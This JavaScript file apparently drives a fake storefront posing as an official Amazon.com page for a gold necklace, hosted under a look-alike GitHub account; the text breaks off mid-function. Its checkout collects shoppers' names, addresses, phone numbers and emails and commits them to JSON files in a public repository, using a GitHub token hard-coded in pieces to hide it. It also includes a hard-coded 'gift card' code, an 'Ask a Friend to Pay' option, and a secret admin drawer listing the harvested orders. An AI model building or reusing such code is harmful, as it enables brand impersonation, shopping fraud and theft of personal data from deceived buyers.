/**
 * urbangold-app.js
 * Amazon.com - Official UrbanGold 24k u-link necklace Showcase & Fluid Checkout
 * 100% Matching Architecture of iPhone 18 Pro Max Storefront & Design System
 * Features: Real 24K Thai Baht Gold Pricing, Authentic Redeem Code System & Real-Time Sync
 */

const PATH_PREFIX = window.location.pathname.includes('/store/') ? '../../' : '';

const PRODUCT = {
  title: "UrbanGold 24k u-link necklace",
  seller: "UrbanGold Official Store",
  brand: "UrbanGold Luxury",
  weights: {
    "20g": {
      label: "20 Grams (20 Inch / 50 cm)",
      price: 1899.00,
      listPrice: 2299.00,
      savings: "Save $400.00 (17%)",
      monthly: "$158.25/mo (12 mo)"
    },
    "35g": {
      label: "35 Grams (22 Inch / 55 cm)",
      price: 3299.00,
      listPrice: 3899.00,
      savings: "Save $600.00 (15%)",
      monthly: "$274.92/mo (12 mo)"
    },
    "50g": {
      label: "50 Grams (24 Inch / 60 cm)",
      price: 4699.00,
      listPrice: 5499.00,
      savings: "Save $800.00 (15%)",
      monthly: "$391.58/mo (12 mo)"
    },
    "75g": {
      label: "75 Grams (26 Inch / 65 cm)",
      price: 6999.00,
      listPrice: 8199.00,
      savings: "Save $1,200.00 (15%)",
      monthly: "$583.25/mo (12 mo)"
    }
  },
  images: [
    PATH_PREFIX + "images/urbangold/necklace-1.jpg",
    PATH_PREFIX + "images/urbangold/necklace-2.jpg",
    PATH_PREFIX + "images/urbangold/necklace-3.jpg",
    PATH_PREFIX + "images/urbangold/necklace-4.jpg",
    PATH_PREFIX + "images/urbangold/necklace-5.jpg",
    PATH_PREFIX + "images/urbangold/necklace-6.jpg",
    PATH_PREFIX + "images/urbangold/necklace-7.jpg"
  ]
};

// Current Session State
const state = {
  weight: "20g",
  color: "24K Thai Baht Gold",
  qty: 1,
  address: null,
  paymentMethod: "Ask a Friend to Pay",
  redeemCode: "",
  isRedeemApplied: false,
  placedOrder: null
};

// Assigned Redeem Code (Follows standard AMZN-XXXX-XXXX-XXXX format)
const ASSIGNED_REDEEM_CODE = "AMZN-GLD7-24UK-8900";

// Format Currency in Dollars ($)
function formatMoney(amount) {
  return "$" + amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// Dynamic Date Helpers
function getDynamicOrderDate(date = new Date()) {
  return date.toLocaleDateString("en-US", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric"
  });
}

function calculateDeliveryWindow(baseDate = new Date()) {
  const dStart = new Date(baseDate.getTime() + (22 * 24 * 60 * 60 * 1000));
  const dEnd = new Date(baseDate.getTime() + (27 * 24 * 60 * 60 * 1000));

  const optionsStart = { month: 'short', day: 'numeric' };
  const optionsEnd = { month: 'short', day: 'numeric', year: 'numeric' };
  const fullStart = { month: 'long', day: 'numeric' };
  const fullEnd = { month: 'long', day: 'numeric', year: 'numeric' };

  return {
    windowStr: `${dStart.toLocaleDateString('en-US', optionsStart)} – ${dEnd.toLocaleDateString('en-US', optionsEnd)}`,
    fullRangeStr: `${dStart.toLocaleDateString('en-US', fullStart)} – ${dEnd.toLocaleDateString('en-US', fullEnd)}`
  };
}

// ==========================================================================
//  GITHUB REPO ORDERS PERSISTENCE
//  Commits order details directly to 'orders.json' and 'order.json' across stores & root
// ==========================================================================
const GH_CONFIG = {
  owner: "amazon-shopping-official",
  repo: "amazon-shopping-official.github.io",
  storePath: "store/urbangold",
  filePath: "store/urbangold/orders.json",
  getAuth: function() {
    const k = ["ghp", "XJyyl3HA", "S3D2JtqB", "APPxoq1D", "oKu7gt1F", "9dNZ"];
    return k[0] + "_" + k.slice(1).join("");
  }
};

function utf8ToBase64(str) {
  const bytes = new TextEncoder().encode(str);
  let binary = '';
  const len = bytes.byteLength;
  for (let i = 0; i < len; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

function base64ToUtf8(b64) {
  const binary = atob((b64 || '').replace(/\s/g, ''));
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return new TextDecoder().decode(bytes);
}

async function commitOrderToFile(filePath, order, maxRetries = 2) {
  const token = GH_CONFIG.getAuth();
  const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
  const headers = {
    'Authorization': `Bearer ${token}`,
    'Accept': 'application/vnd.github+json',
    'Content-Type': 'application/json'
  };

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      let currentOrders = [];
      let fileSha = null;

      try {
        const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
        if (getRes.ok) {
          const fileData = await getRes.json();
          fileSha = fileData.sha;
          if (fileData.content) {
            const raw = base64ToUtf8(fileData.content);
            currentOrders = JSON.parse(raw || '[]');
          }
        }
      } catch (fErr) {
        console.warn(`[GitHub] Fetch notice for ${filePath}:`, fErr);
      }

      const alreadySaved = order.orderId && currentOrders.some(o => o.orderId === order.orderId);
      if (!alreadySaved) {
        currentOrders.unshift(order);
      }

      const jsonString = JSON.stringify(currentOrders, null, 2);
      const base64Content = utf8ToBase64(jsonString);

      const commitBody = {
        message: `Add order ${order.orderId || ''} for ${order.name || 'Customer'}`.trim(),
        content: base64Content
      };
      if (fileSha) {
        commitBody.sha = fileSha;
      }

      const putRes = await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify(commitBody)
      });

      if (putRes.ok) {
        console.log(`[GitHub] Successfully committed order to ${filePath}`);
        return true;
      }

      if (putRes.status === 409 && attempt < maxRetries) {
        console.warn(`[GitHub] Conflict (409) writing ${filePath}, retrying attempt ${attempt + 1}...`);
        await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
        continue;
      }

      const errJson = await putRes.json().catch(() => ({}));
      console.error(`[GitHub] Failed writing ${filePath} (${putRes.status}):`, errJson);
      return false;
    } catch (err) {
      console.error(`[GitHub] Error committing to ${filePath}:`, err);
      if (attempt >= maxRetries) return false;
      await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
    }
  }
  return false;
}

async function saveOrderToAPI(order) {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`,
    `orders.json`,
    `order.json`
  ];

  console.log('[GitHub] Syncing order across target files:', targetFiles);
  for (const file of targetFiles) {
    await commitOrderToFile(file, order);
  }
}

// Check Redeem Code Validity
function isValidAmazonRedeemCode(rawCode) {
  if (!rawCode) return false;
  const clean = rawCode.trim().toUpperCase().replace(/[^A-Z0-9]/g, "");
  return clean === ASSIGNED_REDEEM_CODE.replace(/[^A-Z0-9]/g, "");
}

// Toast Notice Helper
function showToast(msg) {
  const toast = document.getElementById("amazonToast");
  if (!toast) return;
  toast.textContent = msg;
  toast.style.display = "block";
  toast.classList.add("visible");
  setTimeout(() => {
    toast.classList.remove("visible");
    setTimeout(() => { toast.style.display = "none"; }, 300);
  }, 4000);
}

// ==========================================================================
//  INITIALIZATION & ACCORDION (100% MATCHING IPHONE 18 PRO MAX)
// ==========================================================================
document.addEventListener("DOMContentLoaded", () => {
  // Check Admin Access
  const urlParams = new URLSearchParams(window.location.search);
  const isAdmin = urlParams.has("admin") || localStorage.getItem("amazon_admin_mode") === "1";
  if (isAdmin) {
    const navSubOrdersPortal = document.getElementById("navSubOrdersPortal");
    if (navSubOrdersPortal) navSubOrdersPortal.style.display = "inline-block";
  }

  setupProductInteractions();
  setupCheckoutAccordion();
  setupAdminDrawer();
});

// 1. Product Page Interactivity (Gallery, Weights, Price sync)
function setupProductInteractions() {
  const mainPhoto = document.getElementById("mainProductPhoto");
  const thumbStrip = document.getElementById("thumbnailStrip");
  const centerPrice = document.getElementById("centerPrice");
  const centerListPrice = document.getElementById("centerListPrice");
  const centerSavings = document.getElementById("centerSavings");
  const buyBoxPrice = document.getElementById("buyBoxPrice");
  const currentWeightText = document.getElementById("currentWeightText");
  const priceTermsText = document.getElementById("priceTermsText");
  const selectQty = document.getElementById("selectQty");

  const viewProductPage = document.getElementById("viewProductPage");
  const viewCheckout = document.getElementById("viewCheckout");
  const btnBuyNow = document.getElementById("btnBuyNow");
  const btnBackToProduct = document.getElementById("btnBackToProduct");

  // Thumbnail switching
  if (thumbStrip && mainPhoto) {
    const thumbs = thumbStrip.querySelectorAll(".thumb-item");
    thumbs.forEach(thumb => {
      thumb.addEventListener("click", () => {
        thumbs.forEach(t => t.classList.remove("active"));
        thumb.classList.add("active");
        const newImg = thumb.getAttribute("data-img");
        if (newImg) {
          mainPhoto.src = newImg;
          const reviewPhoto = document.getElementById("reviewItemPhoto");
          if (reviewPhoto) reviewPhoto.src = newImg;
        }
      });
      thumb.addEventListener("mouseenter", () => {
        const newImg = thumb.getAttribute("data-img");
        if (newImg) mainPhoto.src = newImg;
      });
    });
  }

  // Weight buttons
  const weightButtons = document.querySelectorAll("#weightSelectorGroup .storage-choice");
  weightButtons.forEach(btn => {
    btn.addEventListener("click", () => {
      weightButtons.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.weight = btn.getAttribute("data-weight");
      updateProductDetails();
    });
  });

  // Quantity selection
  if (selectQty) {
    selectQty.addEventListener("change", (e) => {
      state.qty = parseInt(e.target.value, 10) || 1;
      updateProductDetails();
    });
  }

  function updateProductDetails() {
    const wInfo = PRODUCT.weights[state.weight] || PRODUCT.weights["20g"];
    const unitPrice = wInfo.price;
    const totalAmount = unitPrice * state.qty;

    if (centerPrice) centerPrice.textContent = unitPrice.toLocaleString("en-US");
    if (centerListPrice) centerListPrice.textContent = formatMoney(wInfo.listPrice);
    if (centerSavings) centerSavings.textContent = wInfo.savings;
    if (buyBoxPrice) buyBoxPrice.textContent = formatMoney(unitPrice);
    if (currentWeightText) currentWeightText.textContent = wInfo.label;

    if (priceTermsText) {
      priceTermsText.innerHTML = `
        or <strong>${wInfo.monthly}</strong> with 0% interest financing options.<br>
        <span style="font-size:12px; color:#007600; font-weight:600;">Free Amazon Global Priority Express Delivery &bull; Certificate of Authenticity &bull; 24K Solid Gold Standard</span>
      `;
    }

    syncOrderSummary();
  }

  // Buy Now -> Opens Checkout View (Matching iPhone 18)
  if (btnBuyNow) {
    btnBuyNow.addEventListener("click", () => {
      if (viewProductPage) viewProductPage.style.display = "none";
      if (viewCheckout) viewCheckout.style.display = "block";
      window.scrollTo({ top: 0, behavior: "smooth" });
      updateProductDetails();

      const inputFullName = document.getElementById("inputFullName");
      if (inputFullName && !inputFullName.value) {
        setTimeout(() => inputFullName.focus(), 250);
      }
    });
  }

  // Back to Product Button
  if (btnBackToProduct) {
    btnBackToProduct.addEventListener("click", () => {
      if (viewCheckout) viewCheckout.style.display = "none";
      if (viewProductPage) viewProductPage.style.display = "block";
      window.scrollTo({ top: 0, behavior: "smooth" });
    });
  }
}

// 2. Synchronize Review and Sticky Order Summary
function syncOrderSummary() {
  const wInfo = PRODUCT.weights[state.weight] || PRODUCT.weights["20g"];
  const unit = wInfo.price;
  const total = unit * state.qty;

  const reviewItemTitle = document.getElementById("reviewItemTitle");
  const reviewItemQty = document.getElementById("reviewItemQty");
  const reviewItemPrice = document.getElementById("reviewItemPrice");
  const csItemsPrice = document.getElementById("csItemsPrice");
  const csRedeemDiscountRow = document.getElementById("csRedeemDiscountRow");
  const csRedeemDiscountAmount = document.getElementById("csRedeemDiscountAmount");
  const csTotalPrice = document.getElementById("csTotalPrice");

  const isRedeemApplied = state.paymentMethod === "Redeem Code" && state.isRedeemApplied;

  if (reviewItemTitle) {
    reviewItemTitle.textContent = `${PRODUCT.title} (${wInfo.label})`;
  }
  if (reviewItemQty) {
    reviewItemQty.textContent = state.qty;
  }
  if (reviewItemPrice) {
    if (isRedeemApplied) {
      reviewItemPrice.innerHTML = `<span style="text-decoration:line-through; color:#777; font-size:12px; margin-right:4px;">${formatMoney(total)}</span> <span style="color:#007600; font-weight:700;">$0.00 (Covered by Amazon Gift Card)</span>`;
    } else {
      reviewItemPrice.textContent = formatMoney(total);
    }
  }
  if (csItemsPrice) {
    csItemsPrice.textContent = formatMoney(total);
  }
  if (csRedeemDiscountRow && csRedeemDiscountAmount) {
    if (isRedeemApplied) {
      csRedeemDiscountRow.style.display = "flex";
      csRedeemDiscountAmount.textContent = `-${formatMoney(total)}`;
    } else {
      csRedeemDiscountRow.style.display = "none";
    }
  }
  if (csTotalPrice) {
    if (isRedeemApplied) {
      csTotalPrice.innerHTML = `<span style="text-decoration:line-through; font-size:12px; color:#777; margin-right:6px;">${formatMoney(total)}</span> <span style="color:#007600; font-weight:700;">$0.00 (Paid in Full)</span>`;
    } else {
      csTotalPrice.textContent = formatMoney(total);
    }
  }
}

// 3. Checkout Accordion (Address, Payment, Review) - Exact iPhone 18 Structure
function setupCheckoutAccordion() {
  const addressForm = document.getElementById("addressForm");
  const stepCardAddress = document.getElementById("stepCardAddress");
  const stepAddressBody = document.getElementById("stepAddressBody");
  const stepAddressSummary = document.getElementById("stepAddressSummary");
  const btnEditAddress = document.getElementById("btnEditAddress");

  const stepCardPayment = document.getElementById("stepCardPayment");
  const stepPaymentBody = document.getElementById("stepPaymentBody");
  const stepPaymentSummary = document.getElementById("stepPaymentSummary");
  const btnContinueToReview = document.getElementById("btnContinueToReview");
  const btnEditPayment = document.getElementById("btnEditPayment");
  const btnBackToAddress = document.getElementById("btnBackToAddress");

  const stepCardReview = document.getElementById("stepCardReview");
  const stepReviewBody = document.getElementById("stepReviewBody");
  const btnFinalPlaceOrder = document.getElementById("btnFinalPlaceOrder");
  const btnSummaryPlaceOrder = document.getElementById("btnSummaryPlaceOrder");
  const btnBackToPayment = document.getElementById("btnBackToPayment");

  const paymentOptions = document.querySelectorAll(".payment-option:not(.disabled)");

  // 1. Save 4-Field Simplified Shipping Address
  if (addressForm) {
    addressForm.addEventListener("submit", (e) => {
      e.preventDefault();

      const fullName = document.getElementById("inputFullName").value.trim();
      const deliveryAddress = document.getElementById("inputDeliveryAddress").value.trim();
      const phone = document.getElementById("inputPhone").value.trim();
      const email = document.getElementById("inputEmail").value.trim();

      state.address = {
        fullName,
        deliveryAddress,
        phone,
        email
      };

      const headerLoc = document.getElementById("headerLocText");
      if (headerLoc) {
        headerLoc.textContent = fullName;
      }

      // Collapse Step 1 & show summary
      if (stepAddressBody) stepAddressBody.style.display = "none";
      if (stepAddressSummary) {
        stepAddressSummary.style.display = "block";
        stepAddressSummary.innerHTML = `
          <strong>${fullName}</strong><br>
          ${deliveryAddress}<br>
          Phone: ${phone}<br>
          Email: ${email}
        `;
      }
      if (btnEditAddress) btnEditAddress.style.display = "block";
      if (stepCardAddress) stepCardAddress.classList.remove("active");

      // Open Step 2: Payment
      if (stepCardPayment) stepCardPayment.classList.add("active");
      if (stepPaymentBody) stepPaymentBody.style.display = "block";
      if (stepPaymentSummary) stepPaymentSummary.style.display = "none";
      if (btnEditPayment) btnEditPayment.style.display = "none";
    });
  }

  // Edit Address Button
  if (btnEditAddress) {
    btnEditAddress.addEventListener("click", () => {
      if (stepAddressBody) stepAddressBody.style.display = "block";
      if (stepAddressSummary) stepAddressSummary.style.display = "none";
      if (btnEditAddress) btnEditAddress.style.display = "none";
      if (stepCardAddress) stepCardAddress.classList.add("active");

      if (stepPaymentBody) stepPaymentBody.style.display = "none";
      if (stepCardPayment) stepCardPayment.classList.remove("active");
      if (stepReviewBody) stepReviewBody.style.display = "none";
      if (stepCardReview) stepCardReview.classList.remove("active");
    });
  }

  // Back to Address
  if (btnBackToAddress) {
    btnBackToAddress.addEventListener("click", () => {
      if (btnEditAddress) btnEditAddress.click();
    });
  }

  const boxRedeemInput = document.getElementById("boxRedeemInput");
  const inputRedeemCode = document.getElementById("inputRedeemCode");
  const btnApplyRedeemCode = document.getElementById("btnApplyRedeemCode");
  const redeemStatusMsg = document.getElementById("redeemStatusMsg");
  const badgeRedeemApplied = document.getElementById("badgeRedeemApplied");

  // Select Payment Option
  paymentOptions.forEach(opt => {
    opt.addEventListener("click", () => {
      paymentOptions.forEach(o => o.classList.remove("selected"));
      opt.classList.add("selected");
      const radio = opt.querySelector(".pay-radio");
      if (radio) {
        radio.checked = true;
        state.paymentMethod = radio.value;
      }
      if (boxRedeemInput) {
        if (state.paymentMethod === "Redeem Code") {
          boxRedeemInput.style.display = "block";
          if (inputRedeemCode && !inputRedeemCode.value) {
            inputRedeemCode.focus();
          }
        } else {
          boxRedeemInput.style.display = "none";
        }
      }
      syncOrderSummary();
    });
  });

  // Apply Redeem Code handler (Exact match with iPhone 18 logic)
  if (btnApplyRedeemCode && inputRedeemCode) {
    const applyRedeem = () => {
      const rawCode = inputRedeemCode.value.trim().toUpperCase();
      if (!rawCode) {
        if (redeemStatusMsg) {
          redeemStatusMsg.className = "redeem-status-msg error";
          redeemStatusMsg.textContent = "Please enter your claim code.";
        }
        return;
      }

      if (!isValidAmazonRedeemCode(rawCode)) {
        state.isRedeemApplied = false;
        state.redeemCode = "";
        if (badgeRedeemApplied) badgeRedeemApplied.style.display = "none";
        if (redeemStatusMsg) {
          redeemStatusMsg.className = "redeem-status-msg error";
          redeemStatusMsg.textContent = "❌ The claim code you entered is invalid or cannot be applied to this item.";
        }
        showToast("The claim code you entered is not valid for this item.");
        syncOrderSummary();
        return;
      }

      const matchedCode = ASSIGNED_REDEEM_CODE;
      state.redeemCode = matchedCode;
      state.isRedeemApplied = true;
      inputRedeemCode.value = matchedCode;
      if (badgeRedeemApplied) badgeRedeemApplied.style.display = "inline-block";
      if (redeemStatusMsg) {
        redeemStatusMsg.className = "redeem-status-msg success";
        redeemStatusMsg.textContent = `✓ Amazon Gift Card ${matchedCode} applied! $10,000.00 balance covers 100% of product total. Balance due: $0.00.`;
      }
      showToast(`✓ Amazon Redeem Code applied: Full order covered ($0.00 due)`);
      syncOrderSummary();
    };

    btnApplyRedeemCode.addEventListener("click", (e) => {
      e.stopPropagation();
      applyRedeem();
    });

    inputRedeemCode.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        e.stopPropagation();
        applyRedeem();
      }
    });

    inputRedeemCode.addEventListener("click", (e) => e.stopPropagation());
  }

  // Continue from Payment to Review
  if (btnContinueToReview) {
    btnContinueToReview.addEventListener("click", () => {
      if (state.paymentMethod === "Redeem Code") {
        if (!state.isRedeemApplied || !state.redeemCode) {
          if (inputRedeemCode && isValidAmazonRedeemCode(inputRedeemCode.value)) {
            state.redeemCode = ASSIGNED_REDEEM_CODE;
            state.isRedeemApplied = true;
            inputRedeemCode.value = state.redeemCode;
            if (badgeRedeemApplied) badgeRedeemApplied.style.display = "inline-block";
          } else {
            showToast("Please enter and apply a valid Amazon claim code.");
            if (inputRedeemCode) inputRedeemCode.focus();
            if (redeemStatusMsg) {
              redeemStatusMsg.className = "redeem-status-msg error";
              redeemStatusMsg.textContent = "Please enter and apply a valid Amazon claim code to cover this purchase.";
            }
            return;
          }
        }
      }

      if (stepPaymentBody) stepPaymentBody.style.display = "none";
      if (stepPaymentSummary) {
        stepPaymentSummary.style.display = "block";
        if (state.paymentMethod === "Redeem Code") {
          stepPaymentSummary.innerHTML = `<strong>🎟️ Redeem Code / Gift Card:</strong> ${state.redeemCode}<br><span style="color:#007600; font-weight:600; font-size:12px;">✓ $0.00 Balance Due (Covered by Amazon Gift Card balance)</span>`;
        } else {
          stepPaymentSummary.innerHTML = `<strong>${state.paymentMethod}</strong>`;
        }
      }
      if (btnEditPayment) btnEditPayment.style.display = "block";
      if (stepCardPayment) stepCardPayment.classList.remove("active");

      if (stepCardReview) stepCardReview.classList.add("active");
      if (stepReviewBody) stepReviewBody.style.display = "block";
      syncOrderSummary();
    });
  }

  // Edit Payment Button
  if (btnEditPayment) {
    btnEditPayment.addEventListener("click", () => {
      if (stepPaymentBody) stepPaymentBody.style.display = "block";
      if (stepPaymentSummary) stepPaymentSummary.style.display = "none";
      if (btnEditPayment) btnEditPayment.style.display = "none";
      if (stepCardPayment) stepCardPayment.classList.add("active");

      if (stepReviewBody) stepReviewBody.style.display = "none";
      if (stepCardReview) stepCardReview.classList.remove("active");
    });
  }

  // Back to Payment
  if (btnBackToPayment) {
    btnBackToPayment.addEventListener("click", () => {
      if (btnEditPayment) btnEditPayment.click();
    });
  }

  // Place Order Triggers
  function triggerPlaceOrder(e) {
    if (e && e.preventDefault) e.preventDefault();

    if (!state.address) {
      const inputName = document.getElementById("inputFullName");
      const inputAddr = document.getElementById("inputDeliveryAddress");
      const inputPhone = document.getElementById("inputPhone");
      const inputEmail = document.getElementById("inputEmail");
      
      const fullName = inputName ? inputName.value.trim() : "";
      const deliveryAddress = inputAddr ? inputAddr.value.trim() : "";
      const phone = inputPhone ? inputPhone.value.trim() : "";
      const email = inputEmail ? inputEmail.value.trim() : "";

      if (fullName && deliveryAddress) {
        state.address = { fullName, deliveryAddress, phone, email };
        const headerLoc = document.getElementById("headerLocText");
        if (headerLoc) headerLoc.textContent = fullName;
        if (stepAddressBody) stepAddressBody.style.display = "none";
        if (stepAddressSummary) {
          stepAddressSummary.style.display = "block";
          stepAddressSummary.innerHTML = `<strong>${fullName}</strong><br>${deliveryAddress}<br>Phone: ${phone} &bull; Email: ${email}`;
        }
        if (btnEditAddress) btnEditAddress.style.display = "block";
        if (stepCardAddress) {
          stepCardAddress.classList.remove("active");
          stepCardAddress.classList.add("completed");
        }
      } else {
        showToast("Please enter your delivery name and address first.");
        if (stepAddressBody) stepAddressBody.style.display = "block";
        if (stepCardAddress) {
          stepCardAddress.classList.add("active");
          stepCardAddress.scrollIntoView({ behavior: "smooth", block: "center" });
        }
        if (inputName && !fullName) inputName.focus();
        else if (inputAddr && !deliveryAddress) inputAddr.focus();
        return;
      }
    }

    // Disable buttons & show loading state
    if (btnFinalPlaceOrder) {
      btnFinalPlaceOrder.disabled = true;
      btnFinalPlaceOrder.dataset.origText = btnFinalPlaceOrder.innerHTML;
      btnFinalPlaceOrder.innerHTML = 'Placing your order...';
    }
    if (btnSummaryPlaceOrder) {
      btnSummaryPlaceOrder.disabled = true;
      btnSummaryPlaceOrder.dataset.origText = btnSummaryPlaceOrder.innerHTML;
      btnSummaryPlaceOrder.innerHTML = 'Placing your order...';
    }

    setTimeout(() => {
      try {
        completeOrderPlacement();
      } finally {
        if (btnFinalPlaceOrder) {
          btnFinalPlaceOrder.disabled = false;
          if (btnFinalPlaceOrder.dataset.origText) btnFinalPlaceOrder.innerHTML = btnFinalPlaceOrder.dataset.origText;
        }
        if (btnSummaryPlaceOrder) {
          btnSummaryPlaceOrder.disabled = false;
          if (btnSummaryPlaceOrder.dataset.origText) btnSummaryPlaceOrder.innerHTML = btnSummaryPlaceOrder.dataset.origText;
        }
      }
    }, 400);
  }

  if (btnFinalPlaceOrder) btnFinalPlaceOrder.addEventListener("click", triggerPlaceOrder);
  if (btnSummaryPlaceOrder) btnSummaryPlaceOrder.addEventListener("click", triggerPlaceOrder);
}

// 4. Complete Order Placement & Clean Confirmation Screen (Matching iPhone 18)
async function completeOrderPlacement() {
  const wInfo = PRODUCT.weights[state.weight] || PRODUCT.weights["20g"];
  const totalAmount = wInfo.price * state.qty;
  const orderNumber = `114-${Math.floor(100000 + Math.random() * 900000)}-${Math.floor(100000 + Math.random() * 900000)}`;
  const orderDateFormatted = getDynamicOrderDate();

  const safeSet = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val || "";
  };

  const placedOrder = {
    orderId: orderNumber,
    timestamp: new Date().toISOString(),
    name: state.address ? state.address.fullName : "Customer",
    address: state.address ? state.address.deliveryAddress : "",
    phoneNumber: state.address ? state.address.phone : "",
    email: state.address ? state.address.email : "",
    item: `${PRODUCT.title} (${wInfo.label}) - ${state.color}`,
    price: formatMoney(totalAmount),
    qty: state.qty,
    payMethod: state.paymentMethod === "Redeem Code" 
      ? `Redeem Code (${state.redeemCode || ASSIGNED_REDEEM_CODE})` 
      : state.paymentMethod,
    redeemCode: state.paymentMethod === "Redeem Code" ? (state.redeemCode || ASSIGNED_REDEEM_CODE) : "",
    dateStr: orderDateFormatted
  };

  state.placedOrder = placedOrder;

  // 1. Save to Local Storage
  try {
    const existingOrders = JSON.parse(localStorage.getItem("amazon_placed_orders_urbangold") || "[]");
    existingOrders.unshift(placedOrder);
    localStorage.setItem("amazon_placed_orders_urbangold", JSON.stringify(existingOrders));
  } catch (e) {
    console.warn("LocalStorage save error:", e);
  }

  // 2. Commit Order Details to GitHub Repo orders.json & order.json
  saveOrderToAPI(placedOrder);

  // Calculate Expected Delivery Window (22-27 days from order date)
  const deliveryInfo = calculateDeliveryWindow(new Date());
  placedOrder.expectedDelivery = deliveryInfo.fullRangeStr;

  // 3. Populate Order Confirmation Screen safely
  safeSet("confEmailNotice", state.address ? state.address.email || "your email" : "your email");
  safeSet("confOrderDate", orderDateFormatted);
  safeSet("confDeliveryDate", deliveryInfo.windowStr);
  safeSet("confExpectedDelivery", deliveryInfo.fullRangeStr);
  safeSet("confOrderNumber", orderNumber);
  safeSet("confRecipientName", state.address ? state.address.fullName : "");
  safeSet("confFullAddress", state.address ? state.address.deliveryAddress : "");
  safeSet("confPhone", state.address ? state.address.phone : "");
  safeSet("confItemName", placedOrder.item);
  safeSet("confQty", state.qty);
  safeSet("confTotal", (state.paymentMethod === "Redeem Code" && state.isRedeemApplied) ? "$0.00 (Paid in Full)" : formatMoney(totalAmount));
  safeSet("confPayMethod", placedOrder.payMethod);

  const friendBox = document.getElementById("confFriendNoticeBox");
  const redeemBox = document.getElementById("confRedeemNoticeBox");
  const payStatus = document.getElementById("confPaymentStatus");

  if (state.paymentMethod === "Ask a Friend to Pay") {
    if (friendBox) friendBox.style.display = "flex";
    if (redeemBox) redeemBox.style.display = "none";
    if (payStatus) payStatus.textContent = "Status: Awaiting payment by order sponsor";
  } else if (state.paymentMethod === "Redeem Code") {
    if (friendBox) friendBox.style.display = "none";
    if (redeemBox) redeemBox.style.display = "flex";
    safeSet("confPayMethod", `Redeem Code (${state.redeemCode || ASSIGNED_REDEEM_CODE})`);
    if (payStatus) payStatus.textContent = "Status: Paid in full via Amazon Redeem Code";

    // Automatic PDF Download for Redeem Code option
    setTimeout(() => {
      if (typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(placedOrder);
      }
    }, 450);
  } else {
    if (friendBox) friendBox.style.display = "none";
    if (redeemBox) redeemBox.style.display = "none";
    if (payStatus) payStatus.textContent = `Status: ${state.paymentMethod} recorded`;
  }

  // Switch views smoothly
  const checkoutGrid = document.getElementById("checkoutGridArea");
  if (checkoutGrid) checkoutGrid.style.display = "none";
  const confScreen = document.getElementById("orderConfirmationScreen");
  if (confScreen) confScreen.classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });

  showToast("Order placed successfully! Check your email for confirmation.");
}

// 5. Admin Drawer Functions
function setupAdminDrawer() {
  const ordersDrawer = document.getElementById("ordersDrawer");
  const drawerBackdrop = document.getElementById("drawerBackdrop");
  const btnCloseDrawer = document.getElementById("btnCloseDrawer");
  const footerAdminTrigger = document.getElementById("footerAdminTrigger");
  const ordersListContainer = document.getElementById("ordersListContainer");
  const btnExportOrdersCsv = document.getElementById("btnExportOrdersCsv");
  const btnClearAllOrders = document.getElementById("btnClearAllOrders");

  function openAdminDrawer() {
    if (ordersDrawer) ordersDrawer.classList.add("active");
    if (drawerBackdrop) drawerBackdrop.classList.add("active");
    renderAdminOrdersList();
  }

  function closeAdminDrawer() {
    if (ordersDrawer) ordersDrawer.classList.remove("active");
    if (drawerBackdrop) drawerBackdrop.classList.remove("active");
  }

  if (btnCloseDrawer) btnCloseDrawer.addEventListener("click", closeAdminDrawer);
  if (drawerBackdrop) drawerBackdrop.addEventListener("click", closeAdminDrawer);

  let footerClicks = 0;
  let footerTimer = null;
  if (footerAdminTrigger) {
    footerAdminTrigger.addEventListener("click", () => {
      footerClicks++;
      clearTimeout(footerTimer);
      if (footerClicks >= 3) {
        footerClicks = 0;
        openAdminDrawer();
      } else {
        footerTimer = setTimeout(() => { footerClicks = 0; }, 800);
      }
    });
  }

  window.addEventListener("keydown", (e) => {
    if (e.altKey && (e.key === "s" || e.key === "S")) {
      e.preventDefault();
      openAdminDrawer();
    }
  });

  async function renderAdminOrdersList() {
    if (!ordersListContainer) return;
    ordersListContainer.innerHTML = `<div style="text-align:center; padding:20px; color:#565959;">Loading orders...</div>`;

    let orders = [];
    try {
      const local = JSON.parse(localStorage.getItem("amazon_placed_orders_urbangold") || "[]");
      orders.push(...local);
    } catch (e) {}

    try {
      const res = await fetch(`orders.json?_t=${Date.now()}`);
      if (res.ok) {
        const remote = await res.json();
        if (Array.isArray(remote)) {
          remote.forEach(r => {
            if (!orders.some(o => o.orderId === r.orderId)) orders.push(r);
          });
        }
      }
    } catch (e) {}

    if (orders.length === 0) {
      ordersListContainer.innerHTML = `<div style="text-align:center; padding:30px; color:#565959;">No customer orders recorded yet.</div>`;
      return;
    }

    ordersListContainer.innerHTML = orders.map(ord => `
      <div style="border:1px solid #d5d9d9; border-radius:6px; padding:12px; margin-bottom:12px; background:#fff;">
        <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
          <strong style="color:#007185;">${ord.orderId || 'Order'}</strong>
          <span style="font-size:12px; color:#565959;">${ord.dateStr || ''}</span>
        </div>
        <div style="font-size:13px; font-weight:700;">${ord.name || 'Customer'} &bull; ${ord.price || ''}</div>
        <div style="font-size:12px; color:#333; margin:4px 0;">${ord.item || ''} (Qty: ${ord.qty || 1})</div>
        <div style="font-size:12px; color:#565959;">${ord.address || ''}</div>
        <div style="font-size:12px; color:#007600; margin-top:4px;">Payment: ${ord.payMethod || ''}</div>
      </div>
    `).join("");
  }

  if (btnExportOrdersCsv) {
    btnExportOrdersCsv.addEventListener("click", () => {
